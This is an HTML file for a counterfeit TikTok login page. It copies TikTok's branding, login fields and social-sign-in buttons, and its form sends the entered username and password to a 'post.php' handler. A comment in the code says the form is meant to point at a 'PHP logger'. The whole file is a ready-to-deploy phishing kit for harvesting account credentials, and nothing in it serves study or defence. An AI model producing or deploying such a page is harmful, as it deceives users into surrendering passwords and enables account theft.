<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok - Log In</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 100%;
      max-width: 420px;
      padding: 30px 24px;
      background: #111;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
      text-align: center;
    }
    .logo {
      font-size: 3.2rem;
      font-weight: bold;
      letter-spacing: -2px;
      margin-bottom: 8px;
      color: #fff; /* TikTok white */
    }
    .subtitle {
      font-size: 1.1rem;
      color: #aaa;
      margin-bottom: 32px;
    }
    .tabs {
      display: flex;
      justify-content: center;
      margin-bottom: 24px;
    }
    .tab {
      padding: 12px 24px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      border-bottom: 3px solid transparent;
      transition: all 0.2s;
    }
    .tab.active, .tab:hover {
      color: #fff;
      border-bottom: 3px solid #fe2c55;
    }
    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 0.95rem;
      color: #ccc;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      font-size: 1rem;
      background: #222;
      border: 1px solid #444;
      border-radius: 8px;
      color: #fff;
      outline: none;
      transition: border 0.2s;
    }
    input:focus {
      border-color: #fe2c55;
    }
    .btn-login {
      width: 100%;
      padding: 14px;
      font-size: 1.1rem;
      font-weight: 600;
      background: #fe2c55;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin: 16px 0 12px;
      transition: background 0.2s;
    }
    .btn-login:hover {
      background: #d91e4a;
    }
    .or {
      color: #777;
      margin: 16px 0;
      font-size: 0.95rem;
    }
    .social-btn {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      background: #222;
      border: 1px solid #444;
      border-radius: 8px;
      color: #fff;
      font-weight: 500;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    .footer {
      margin-top: 32px;
      font-size: 0.85rem;
      color: #888;
    }
    .footer a {
      color: #fe2c55;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">TikTok</div>
    <div class="subtitle">Log in to your account</div>

    <div class="tabs">
      <div class="tab active">Use phone / email / username</div>
    </div>

    <!-- This is the form you'll point to your PHP logger -->
    <form action="post.php" method="POST">
      <div class="form-group">
        <label for="login">Phone / Email / Username</label>
        <input type="text" id="login" name="username" placeholder="Phone or email or username" required autocomplete="off"/>
      </div>

      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off"/>
      </div>

      <button type="submit" class="btn-login">Log in</button>
    </form>

    <div class="or">or</div>

    <button class="social-btn"><i class="fab fa-google"></i> Continue with Google</button>
    <button class="social-btn"><i class="fab fa-facebook-f"></i> Continue with Facebook</button>
    <button class="social-btn"><i class="fab fa-apple"></i> Continue with Apple</button>

    <div class="footer">
      Don't have an account? <a href="#">Sign up</a><br><br>
      By continuing, you agree to TikTok's <a href="#">Terms of Service</a> and confirm that you have read TikTok's <a href="#">Privacy Policy</a>.
    </div>
  </div>

</body>
</html>
